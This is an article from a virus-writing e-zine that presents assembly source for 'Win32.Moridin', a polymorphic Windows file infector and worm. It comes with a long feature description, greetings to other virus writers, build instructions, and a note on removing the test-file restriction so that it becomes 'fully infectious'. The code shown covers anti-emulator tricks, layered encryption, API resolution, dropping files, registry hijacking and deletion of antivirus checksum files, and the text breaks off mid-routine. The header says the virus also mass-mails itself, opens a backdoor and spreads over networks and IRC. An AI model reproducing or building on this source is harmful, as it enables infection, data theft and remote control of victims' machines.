
   ;                                             ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                             ³ Xine - issue #5 - Phile 201 ³
   ;                                             ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ





   ;                  ---------moridin.asm------------
   ;
   ;                Asmodeus iKX proudly presents
   ;
   ;       ßÛÜ   ÛÜ  ÜßßßÜ ßÛßßÜ  Û   ßÛßßÜ  Û   ßÛÜ   ßÜ
   ;        Û Û Û Û Û    Û  Û   Û  Û   Û   Û  Û   Û Û   Û
   ;        Û  Û  Û Û    Û ßÛßÛß   Û   Û   Û  Û   Û  Û  Û
   ;        Û     Û Û    Û  Û  ßÜ  Û   Û   Û  Û   Û   Û Û
   ;       Üß    Üß ßÜÜÜÜß ß    ß  ßÜ ÜßÜÜÜß  ßÜ Üß   ßÜß
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   ù     Espionage enabling (backdoor daemon), EPO, Polymorphic, retro,   ù
   ;   ù     armoured, RegiKX "resident" Win32 PE, DOC, Network, mIRC, pIRCH, ù
   ;   ù     vIRC97, HTML, Netbus, E-Mail infector (Outlook and Pegasus)      ù
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Disclaimer
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   The author of this program can't be held responsibility for any
   ;   damage taken after compiling this source. It was ment only for
   ;   educational purposes.
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   What does Moridin mean?
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   It was taken from the series of books called Wheel of Time by
   ;   Robert Jordan. It's in the old tongue, and means "death/grave".
   ;   The sentence "Tia mi aven Moridin vadin" is also in the old tongue.
   ;   And means "The grave/death is no bar/barrier to my call/summon".
   ;   There is also a charater in this series of book that uses the alias
   ;   Moridin. He is the most powerful of the forsaken (evil channelers :) ),
   ;   I named the polymorphic engine "vadin" which means barrier/bar.
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Note
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Hey everyone! I know this virus was to be finnished a long time ago
   ;   but for some reason I always find something new to improve/add to
   ;   my program :) I have been working hard to rid all the bugs and I
   ;   hope I have succeded some what. I know that no program can be
   ;   totaly bug free, but you can always hope ;) This program is sort
   ;   of a merge of 3 diffrent other programs I have made. Btw I know
   ;   that you're frustrated by the fact I say program instead of virus
   ;   so I'll say virus from now on :) First of all I coded the win32.festis
   ;   virus that used the same "residency" as this virus. Also I have
   ;   used features from my win32.StraightHate worm/virus. And finaly
   ;   I used macro code from my macro virus MrJim. None of those
   ;   three viruses has ever been released so here it is, the combined
   ;   power of those viruses >:) (cept from MrJim which the little bitch
   ;   Intel-Serv or what ever his name was tricked me on...)
   ;   I think I have totaly spent something like 12+ months on this virus, and
   ;   I have been coding a little now and then, so if you get psychotic reading
   ;   the source, know it was not my intensions. I coded the virus with spread
   ;   and compatibility in mind. I have had a difficult time finding and
   ;   eliminating all the bugs that it had in it's most early form. I removed
   ;   some "features" for more compatibility reasons. As a side effect of gaining
   ;   compatibility and spreading speed the virus has grown some what bloated and
   ;   unoptimized. Well I ain't too much for optimizing. Of course you could use
   ;   it to prove your coding skills, but that's not why I'm coding :)
   ;   The main purpose in this virus was to combine some powerful ITW features
   ;   Until some days ago I have coded without adding comments,
   ;   so I started to look through the code and added some comments, but
   ;   when I got through half the virus I got tired... if you want something
   ;   explained, please send an email. I promise I'll write comments in my
   ;   next viruses :), it's good for both me and you.
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Information overflow
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   PRIMARY BODY (APPENDED TO INFECTED FILES)
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   When an infected file is started a chunk of bytes that was inserted
   ;   at program entry point, gets the address of where the polymorphic
   ;   decryptor is stored, PUSHs it on stack and RET to it. The polymorphic
   ;   dencryptor will save the initial stack value, check if code is being
   ;   emulated, if so it jumps 256 bytes into the encrypted code, causing
   ;   the emulator to drop out. It will then check if code is already decry-
   ;   pted. You may think this is silly, but at bootup windows sometimes
   ;   shares the program images in memory and it gets executed twise. Well
   ;   I do disable the share flag of the section, but for precaution I check
   ;   anyway. When I decrypted the code the now unencryped virus will take
   ;   over control. After the virus calculated the imagebase and delta offset
   ;   it will set up an SEH frame to guard the execution flow. Before this
   ;   it generated a GP fault and handled the exception using a SEH frame,
   ;   this neat trick fools emulators. I don't know who first used it, maybe
   ;   LeathalMind or jacky qwerty? It will first locate the kernel32.dll address
   ;   in memory using the initial stack (we are called from within kernel32.dll)
   ;   It will then search through kernel32.dll export directory, locating
   ;   GetProcAddress API. It will use this API to fetch the rest of the
   ;   APIs needed. It will then also collect some APIs from ADVAPI.DLL.
   ;   When ready it collects a number of diffrent directories, and preserves
   ;   the current directory. It then allocated some memory and writes the
   ;   original 7 bytes (from the entry point) in the allocated memory. Next
   ;   in the schedule is to drop the dropper files, it's primary location is
   ;   the <windows\system> directory, if the user hasn't enough with access
   ;   to write there it will drop in the <windows\temp> directory. As all users
   ;   share the same \Temp directory (with default settings), in winNT it will
   ;   enable the virus to spread even on restricted clients. It will then
   ;   change the register so the execution flow is high-jacked. There is a
   ;   security hole in NT/9x OS that makes it possible to modify the system
   ;   registry without problems. This due to the fact all users are member
   ;   of the "Everyone" group that have permission to modify system registry.
   ;   All files executed after this will have to pass through our dropper that
   ;   ofcourse is infected with the virus :)) Also this is shared by all NT
   ;   users by default and the virus will there for stay "resident" in the
   ;   system registry and Temp (or system) directory. It will share C:\ with
   ;   fullaccess, and set the password to IKX. The share is both hidden to the
   ;   system and the network using some neat tricks :) Also one of the
   ;   dropped files which is a VBS script will be added to system bootup
   ;   and will be run at next reboot. This script will if Outlook is installed
   ;   Email an infected dropper (disguising with WinZip selfextractor icon, and
   ;   fake error message) to the first 50 persons in the address book.
   ;   Next thing to do is remove all the possible checksum files in the
   ;   current directory we're about to infect.
   ;   It will now look for five exe/scr files in current directory and infect
   ;   them by increasing the last section and appending the virus code.
   ;   It will search the second section for "WinZip (R)" text, if it's
   ;   found, then the exe is an WinZip-Selfextractor and it will avoid
   ;   infecting in, as they contain a self-validation check. It will instead
   ;   of redirecting the entrypoint, insert a block of code
   ;   at program entry point that will pass control to the polymorphic
   ;   decryptor it recently generated and wrote at the end of last section.
   ;   It will avoid infecting files in the \system32 directory as some of
   ;   those perform integrity checks. When finnished it will fetch the original
   ;   7 bytes of the file from the allocated memory, write it back in memory
   ;   and jump there, giving back control to the host.
   ;
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   SECONDARY BODY (DROPPER)
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   After registry has been "hooked" all execution flow will pass through
   ;   this file. The file to be executed and its arguments will be in the
   ;   Commandline. It will deny the execution of most AV programs and REGEDIT
   ;   to avoid detection. The dropper will also connect to the Local area
   ;   network and parse through 5 randomly selected users each time its started.
   ;   It look through the shares of those users and see if it's connectable,
   ;   if it is it will connect it and try drop the virus there (as NETX.EXE),
   ;   also it will drop an AUTORUN.INF. If someone has mounted this share he
   ;   will (if he click the drive) be infected with the virus as well.
   ;   NETX.EXE is a copy of the dropper, and the dropper will if executed in
   ;   NETX.EXE bring up the explorer window (if you click a mounted drive, you
   ;   expect a explorer window to pop up, right? :)) The dropper will also
   ;   execute the program in the commandline (the file the user clicked in
   ;   explorer). If the file being executed is mirc32, pirch98 or virc97 it
   ;   will copy itself as CRACK.EXE into the mirc32 (for instance) directory and
   ;   drop a script.ini (or events.ini etc etc). Those script will enable the
   ;   virus to spread over IRC chat channels when ever someone mentions the word
   ;   *CRACK* inside the channel, or (in pirch98, virc97) someone joins the
   ;   channel. It will also look for HTML files and if found drop a SETUP.EXE
   ;   in the html directory and then add a link to that file, this will enable
   ;   virus to spread from homepages. The dropper also contains some retro
   ;   functions, like finding active AV monitors and closing them. More over
   ;   it will get the Word97 and Word2000 template directory from the registry
   ;   disable/lower macro security level, then drop a Normal.dot containing
   ;   a macro loader. It will also drop in the system directory some macro
   ;   source code. This source code will be injected by the loader into the
   ;   ThisDocment Class of Normal.dot. From then on, when ever a file is closed
   ;   in Word97 and/or Word2000 the macro code will be attached to the document
   ;   also the macro will summon the dropper to append itself to the end of
   ;   the document (the virus infected dropper). See graphics for more info
   ;
   ;    _________
   ;   |INFECTED |
   ;   |DOCUMENT |
   ;   | XXXXXX  | ------ W32MORI.EXE -> INFECTS COMPUTER
   ;    ---------
   ;
   ;    _________
   ;   |INFECTED |      - NORMAL.DOT  -> CONTAINS LOADER
   ;   |EXE-FILE |     |
   ;   | XXXXXX  | ------ IMPMORI.DRV -> IMPORTED INTO NORMAL.DOT
   ;    ---------
   ;
   ;   The macro code also looks if Pegasus mail client is installed, if so
   ;   it will generate a new message with infected document attached. It will
   ;   get the address of one of the outgoing messages and send the new message
   ;   to the same address.
   ;
   ;   While a file is being executed a loop will wait for the program
   ;   to exit. First it will look for signs of internet being used
   ;   (check for some common programs like ICQ), if detected it will
   ;   get the IP address of the infected user and zero the class-D
   ;   field (a.b.c.d) and start from zero going up to 255 looking for
   ;   hosts with netbus or netbios installed. If netbus is found
   ;   it will upload/execute itself to the backdoor infested system (thanks
   ;   T-2000 for the idea), if netbios was found it means the system
   ;   has network sharing enabled.. it will enumerate the IP
   ;   and look for possible disk shares to infect. If there is no
   ;   internet tools found, then it will create a new thread with a backdoor
   ;   function that will listen on port 24. With this backdoor anyone with the
   ;   right client program can (send messages, upload/execute files,
   ;   open/close CD, close server).
   ;
   ;   Here's a quick layout of the polymorpic decryptor generated by POLY.Vadin
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   [POLY.Vadin beta 0.9] by Asmodeus iKX
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   ENTRY_REG * Generated during EPO calculating and writing
   ;               it's the new entry point
   ;
   ;   ADD ENTRY_REG,(POLY_SIZE+2)          ; poly_size + 2 bytes (jmp)
   ;   CMP WORD PTR [ENTRY_REG], "XX"       ; Check if encrypted
   ;   JNZ @@1                              ; If it is encrypted, then continue
   ;   RET                                  ; Return to kernel32.dll
   ;   <JUNK>                               ; Random junk
   ;   @@1:
   ;   MOV  STACK_REG,[ESP]                 ; We must save the initial stack
   ;   PUSH STACK_REG
   ;   <JUNK>
   ;   MOV  RAN_REG,DS                      ; We have to stop those evil
   ;   PUSH RAN_REG                         ; emulators before they snatch
   ;   POP  DS                              ; us out of our protective
   ;   MOV  RAN_REG_2,DS                    ; shell! There for before
   ;   CMP  RAN_REG,RAN_REG_2               ; we decrypt we check for presence
   ;   JNE  CRASH_EMULATOR                  ; of an emulator and jmp
   ;   <JUNK>                               ; into encrypted code if so >:)
   ;   MOV  LEN_REG,DECRYPT_LEN (*)         ; Get lenght of code to decrypt
   ;   PUSH LEN_REG             (*)         ; play with it
   ;   POP  ECX                 (*)         ; get it into ecx, just 1 fixed byte
   ;   <JUNK>                               ; Junky junk :)
   ;   MOV  PTR_REG,POINTER_TO_CODE  (*)    ; Where to start decrypt
   ;   <JUNK>                               ; bla bla
   ;   MOV  CRPT_REG,CRYPT_KEY       (*)    ; Random encryption key
   ;   <JUNK>                               ; yada yada
   ;   DECRYPT_IT:                          ; "loop" label
   ;   XOR  [PTR_REG],CRPT_REG              ; decrypt 4 bytes each time
   ;   ADD  PTR_REG,4                       ; next 4 bytes
   ;   LOOP DECRYPT_IT                      ; loooooper
   ;   POP EDX                              ; EDX = original stack
   ;   <JUNK>                               ; Padding out the poly engine size
   ;   <JUNK>                               ; it's has a fixed size of 60 bytes
   ;   <JUNK>                               ;
   ;
   ;  TOTAL SIZE : 70 bytes + junk ( 21 bytes ) = 91 bytes
   ;
   ; (*) Code can be shuffled and junk code can be inserted
   ;
   ;  As you can see the generated decryptor is very simple and generic and
   ;  will merely make detection a bit more difficult. I wanted to code a
   ;  polyengine, so why not? It's not the best out there but not the worst
   ;  eighter (I hope :)) well well..
   ;
   ;+ Beta testers : I'd really like to thank Pax, VirusBuster, Bhunji
   ;   F0re, Ice for helping me to beta test it.
   ;
   ;+ Source of insperation : First of all Robert Jordan with his wonderful
   ;  books. Also music like Dimmu Borgir (Spiritual Black Dimensions) and
   ;  Slipknot, Soulfy, Sepultura, Korn, Strife, Limp Bizkit. Tristania
   ;  The Sins of Thy Beloved, Siebenb*rgen, Theatre of tragedy. If you never
   ;  heard them, please download and enjoy!
   ;
   ;+ Technology greets : This was a learning experience of mine, as it
   ;  was my first win32 virus. I really like to thank those who help me
   ;  a lot indirectly by writing good tutorials/articles or helping me
   ;  directly with answers to stupid questions ;-)
   ;
   ;  Network part: I learned a lot from B0Z0s Win32.Apathy virus, nice work!
   ;
   ;  Netbus part : First done by T-2000/IR
   ;
   ;  Email part  : Zulu the leading email worm/virus coder :)) He actally
   ;                coded the VBS script, thanks man!
   ;
   ;  Lord Julus  : When I first started out your tutorial was like a wish
   ;                comming true, good work man!
   ;
   ;  Billy Belcbu: Your cool win32 tutorial made me start coding the
   ;                polyengine, you truly illuminated the subject ;-)
   ;
   ;  Mukry       : The RegIKX residency, acually I didn't know you were
   ;                doing this as well :)) We solved it in diffrent ways
   ;                but with similiar results, well nice we had the same
   ;                idea :)
   ;
   ;  StarZer0    : Thanks for the direct help on IRC :) You help me
   ;                a lot! You're THE master of ASM :))
   ;
   ;  Dageshi     : Help with multiparite/DOC/PE infection, you rule :)
   ;
   ;  Jackie, Arzy: Thanks for direct help on IRC about VBA coding :)
   ;  Lyskovick,
   ;  Simon7
   ;ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·
   ;:    ----------------------------Greets----------------------------------   :
   ;ú Jackie   : Thanks for all the VBA help! say hi to your                    ú
   ;ú            cute girlie from me ;)                                         ú
   ;ú Lyskovick: VBA semi-god :)                                                ú
   ;ú G-cide   : Best luck with your coding                                     ú
   ;ú Vital    : Nice to have a fellow scandinavian in iKX :)                   ú
   ;ú Griyo    : push ecx <--- 2 bytes, ohh mama                                ú
   ;ú Bozo     : You should rejoin Ikx! :)                                      ú
   ;ú Dageshi  : dello, I didn't forget ya :)                                   ú
   ;ú HardCore : Hey I like strife, but Slipknot is better :)                   ú
   ;ú F0re     : I like you're little network ;-)                               ú
   ;ú Ice      : God of the assembler :))                                       ú
   ;ú N0ph     : Nifty to infect .txt files :)                                  ú
   ;ú Bhunji   : Lycka till med tjejen du snackade om                           ú
   ;ú Benny    : You rule man, very cool articles!                              ú
   ;ú PaX      : Beta tester, thanks for the help man!                          ú
   ;ú Prizzy   : Hey, Win32.Crypto is awesome!                                  ú
   ;ú Star0    : Howdy ho! I hope i'll finnished some more code ;)              ú
   ;ú Zulu     : I owe you one! If you need ASM code, please send an mail ;)    ú
   ;  Billy    : Damn you're good!                                              ú
   ;ú Darkman  : Danish version of edit.com sucks :)                            ú
   ;ú Vecna    : The man, the myth, the legend.                                 ú
   ;  VirusBstr: Best beta tester there is! :)) well pax is good also           ú
   ;  Simon7   : Master of scripting.                                           ú
   ;  Flitnic  : Long time no see                                               ú
   ;  Arzy     : You got cable connection now?                                  ú
   ;  T-2000   : visit #vir more often                                          ú
   ;  Morphie  : Miss you :)                                                    ú
   ;  GigaByte : In every generation there is a chosen one....ugh.. :)          ú
   ;  DarkAvngr: Haha :)                                                        ú
   ;ÈÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄùú                  úùÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¼
   ;build it:
   ; copy/paste the diverse parts into a file each
   ; compile MOR_DROPPER.ASM like this:
   ; tasm32 -ml -m5 -q -zn MOR_DROPPER.ASM
   ; tlink32 -Tpe -aa -x MOR_DROPPER.obj,MOR_DROPPER.exe,,IMPORT32.LIB
   ; pewrsec MOR_DROPPER.exe
   ; INCPRO MOR_DROPPER.EXE and past into MOR_DROP.INC (make a HEX/DB script of
   ; code)
   ;
   ; Compile moridin.asm <--- results in complete virus
   ; In current state it will only infect GOAT*.EXE files,
   ; to test it's full capabilites remove GOAT and leave
   ; only *.EXE and it will be fully infectious.

   .586p
   .model  flat


   extrn   ExitProcess:PROC
   extrn   MessageBoxA:PROC

   kernel                equ 0BFF70000h
   kernel_NT             equ 077F00000h
   kernel_2k             equ 077E80000h
   HKEY_CLASSES_ROOT     equ 80000000h
   HKEY_LOCAL_MACHINE    equ 80000002h
   REG_SZ                equ 1
   REG_BINARY            equ 3
   REG_DWORD             equ 4
   virtual_size          equ 8d
   virtual_address       equ 12d
   physical_size         equ 16d
   physical_offset       equ 20d
   section_flags         equ 36d
   max_path              equ 260d

   viruslen       equ virus_end-real_start
   poly_size      equ 70d

   call_           macro   vx_api
                   call    dword ptr [ebp+vx_api]
                   endm
   .data

   junk    db      "First generation",0


   .code

   fake_start:

   mov     edx,[esp]       ; EDX=STACK (saved by poly engine)
   jmp     real_start

   fake_end:

   ; This is the "fake" host that control will be given to after the
   ; first generation of the virus has finnished execution. It will
   ; display a message then return back to OS.

   pop    dword ptr [ebp+old_imagebase]  ; Get Old entry point, old imagebase
   pop     dword ptr [ebp+old_eip]       ; from stack. This is not neccesary,
                                         ; but I wanted to preserve the stack
                                         ; even in first generation :)
   push    10h
   Push    offset virus_cap           ;
   Push    offset virus_mess          ; Display message
   Push    0h                         ;
   call    MessageBoxA

   push    0h
   call    ExitProcess               ; Return to OS

   virus_cap      db "[asmodeus iKX presents]",0

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   [W97-2K/Win32.Moridin 1.0] by Asmodeus iKX
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; From here on is the "real" virus code, it is in second generation protected
   ; with a layer of encryption (generated by polyengine).

   real_start:
   jmp     moridin
   marker db "XX",0    ; Encryption mark, checked in the polymorphic decryptor
   moridin:

   and     edx,0ffff0000h  ; Want it in pages

   call    get_delta       ;
   get_delta:              ; EBP= Delta offset
   pop     ebp             ;
   mov     eax,ebp         ;
   sub     ebp,offset get_delta

   mov     ebx,1000h       ; Patched at infection with the new EIP
   patch_eip equ $-4
   add     ebx, get_delta-real_start ;
   sub     eax,ebx                   ; Calculate Imagebase

   sub     eax,poly_size             ; adjust with the size of decryptor
   mov     dword ptr [ebp+old_imagebase],eax ; Save imagebase
   mov     dword ptr [ebp+the_stack],edx     ; save the "paged" stack


   cmp     ebp,0                           ; Check if first generation
   je      over_crypt                      ; jump past decryption if so.

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Armour Part 1: Defeating some emulators
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ; Second encryption layer will be decrypted here. This decryptor/encryptor
   ; uses 4 static, 1 byte layers of XOR encryption. It's used incase some
   ; emulator gets past the first "polymorphic" layer of encryption.
   ; Just before we decrypt we will set up an SEH frame, then cause
   ; an GP fault. Not many emulators can handle this :)

   ;mov     eax,fs:[20h]      check if fs:[20h] is zero, if not
   ;test    eax,eax           we are being debugged (jump past decryption :))
   ;jne     nod_emul          REMOVED FOR COMPATIBILITY WITH WIN2K PRO
   ;                          Thanks to billy for reminding me about
   ;                          this uncompatibility.

   pushad                                  ; save all registers on stack
   lea     eax,[ebp+fool_emulators]        ; pointer to our new SEH handler
   push    eax                             ; put it on stack
   push    dword ptr fs:[0]                ; save old SEH handler
   mov     fs:[0],esp                      ; replace current SEH with ours.
   xor     eax,eax
   xor     dword ptr [eax],ebp

   jmp     restore_from_gp
   fool_emulators:
   mov     esp, dword ptr [esp+8]          ; Get preserved old stack.
   restore_from_gp:
   pop     dword ptr fs:[0]                ; restore old SEH from stack
   add     esp,4                           ; fix our old stack
   popad                                   ; get old register values from stack

   call    enc_it                          ; Decrypt virus body

   ; From here on 'till the crypt_end is the code encrypted with the
   ; 2nd layer of encryption (well it's really 4 of them, plus 1 polymorphic :))

   crypt_start:

   over_crypt:

   push    dword ptr [ebp+old_eip]         ; Put Host entry point on stack
   push    dword ptr [ebp+old_imagebase]   ; Also save the calculated imagebase

   call    get_kernel32                    ; Get the kernel32 address from stack
   test    eax,eax                         ; on error restore control to host
   je      restore

   call    get_apis                        ; Get the APIs from kernel32.dll

   push    10d                             ; allocate 10 bytes of memory
   push    0h                              ; GMEM_FIXED
   call_   AGlobalAllocA                   ; Allocate it!
   mov     dword ptr [ebp+store_org_bytes],eax ; address of allocated memory
   mov     edi,eax                         ;
   lea     esi, org7bytes                  ; save our 7 bytes in the
   add     esi,ebp                         ; allocated memory
   mov     ecx,7                           ;
   cld                                     ; clear direction flag
   rep     movsb                           ; move 'em!

   pushad                                  ; save all registers on stack
   lea     eax,[ebp+exception_handler]     ; pointer to our new SEH handler
   push    eax                             ; put it on stack
   push    dword ptr fs:[0]                ; save old SEH handler
   mov     fs:[0],esp                      ; replace current SEH with ours.

   no_problem:

   lea     eax, [ebp+advapi_dll]           ; EAX = ADVAPI32
   push    eax
   call_   ALoadLibraryA                   ; Use this API for comp with win2k pro
   test    eax,eax
   je      restore
   mov     dword ptr [ebp+advapi_dll_], eax ; Save the handle we reccieved in EAX

   lea     esi, [ebp+ARegCreateKey]        ; First API in our list
   lea     edi, [ebp+ARegCreateKeyA]       ; Where to store the address

   nt_get_all_apis:
   push    esi                             ; save the source
   mov     eax, dword ptr [ebp+advapi_dll_] ; where to look for the API
   push    eax
   call_   AGetProcAddressA                ; Get address of api!
   test    eax,eax                         ; Get out of here if error accured.
   je      no_more_nt_apis                 ;
   stosd                                   ; Address that EAX hold is written
                                           ; to EDI, ESI is increased a DWORD
   nt_more_inc:
   inc     esi                             ; increase ESI
   cmp     byte ptr [esi], 0               ; check if it's at the end of the API
   jne     nt_more_inc                     ; if not keep on going till we reach it
   inc     esi                             ; ESI = next api
   cmp     byte ptr [esi], 0FFh            ; check if last...
   jne     nt_get_all_apis                 ; if not, get it!

   no_more_nt_apis:

   push      260d                          ; size of buffer
   lea       eax, [ebp+Win_Dir]            ; pointer to buffer
   push      eax
   call_     AGetWindowsDirectoryA         ; Now get the Windows directory

   push      260d
   lea       eax, [ebp+Win_Sys_Dir]
   push      eax                           ; Save Windows\System directory
   call_     AGetSystemDirectoryA

   lea       eax, [ebp+Current_Dir]
   push      eax
   push      260d                          ; Save current directory
   call_     AGetCurrentDirectoryA

   lea       eax, [ebp+winnt_drop]
   push      eax
   push      260d                          ; Save Temp directory
   call_     AGetTempPathA
   test      eax,eax
   jne       sec_temp

   lea       eax, [ebp+hardcore_temp]
   push      eax
   lea       eax, [ebp+winnt_drop]         ; If failed then get static
   push      eax                           ; C:\TEMP directory
   call_     AlstrcatA

   sec_temp:

   lea       eax, [ebp+winnt_temp+1]       ; prepare the new registry value
   push      eax                           ; for using the stack as dropper
   push      260d                          ; directory.
   call_     AGetTempPathA
   test      eax,eax
   jne       good_temp

   lea       eax, [ebp+hardcore_temp]      ; If we failed to get the temp
   push      eax                           ; directory, assume a hardcored
   lea       eax, [ebp+winnt_temp]         ; value for the registry as well.
   push      eax
   call_     AlstrcatA

   good_temp:

   win_sys_drop:

   lea     edx,[ebp+Win_Sys_Dir]           ; Set current directory = <windows\system>
   call    set_dir

   call    drop_files                      ; Try drop our files
   cmp     word ptr [ebp+dropflag], 0FFh   ; if we couldn't drop files,
   je      temp_drop                       ; jump to temp_drop

   mov     dword ptr [ebp+offset nr_to_inf], 1  ; # of files to infect
   lea     ebx, [ebp+file_6]               ; what file(s) to infect
   call    infect_dir                      ; infect it

   mov     dword ptr [ebp+offset nr_to_inf], 1  ;  ------""------
   lea     ebx, [ebp+file_3]
   call    infect_dir

   call    set_reg                         ; Modify system registry

   lea     ebx,[ebp+Win_Sys_Dir]
   call    mark_reg_drop

   jmp     all_os

   temp_drop:

   lea     edx,[ebp+winnt_drop]            ; Set current directory = <tempdirectory>
   call    set_dir

   call    drop_files                      ; Try drop files
   cmp     word ptr [ebp+dropflag], 0FFh   ; on error skip rest
   je      all_os

   mov     dword ptr [ebp+offset nr_to_inf], 1  ; # files to infect....
   lea     ebx, [ebp+file_6]               ; yada , yada....
   call    infect_dir                      ; ....

   mov     dword ptr [ebp+offset nr_to_inf], 1
   lea     ebx, [ebp+file_3]
   call    infect_dir

   call    set_nt_reg                      ; Change system registry

   lea     ebx,[ebp+winnt_drop]
   call    mark_reg_drop

   jmp     all_os

   all_os:

   lea     edx,[ebp+Current_Dir]           ; Currentdirectory =
   call    set_dir                         ; Original directory

   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   RETRO Part 1: Deleting Checksum files
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Well this is not a very aggressive form of retro, and it is not
   ;   destructive as the checksum files has no other use than protect
   ;   against viruses and what can I say, we don't like that do we? :)

   lea     edi,black_listed
   dec     edi
   kill_loop:
   inc     edi
   cmp     byte ptr [edi], 0FFh
   je      all_killed
   cmp     byte ptr [edi], 011h
   jne     kill_loop
   inc     edi
   push    edi
   call    kill_em
   pop     edi
   jmp     kill_loop
   all_killed:

   lea     edx, [ebp+Current_Dir]          ;
   xor     ecx,ecx                         ; EDX=Orginal directory
   check_sys_slash:                        ; ECX=0
   inc     edx                             ; EDX+1
   cmp     byte ptr [edx], "\"             ; Check if EDX = "\"
   jne     check_sys_slash                 ; if not keep increasing it
   cmp     ecx,1                           ; ECX=1 ?
   je      check_sys_name                  ; If so check the name
   inc     ecx                             ; ECX= 0 +1 = 1
   jmp     check_sys_slash                 ; restart the loop
   check_sys_name:                         ;
   add     edx,5                           ; past \SYST
   cmp     dword ptr [edx], "23ME"         ; check if it's "(SYST)EM32"
   je      restore                         ; or "(syst)em32", if so don't
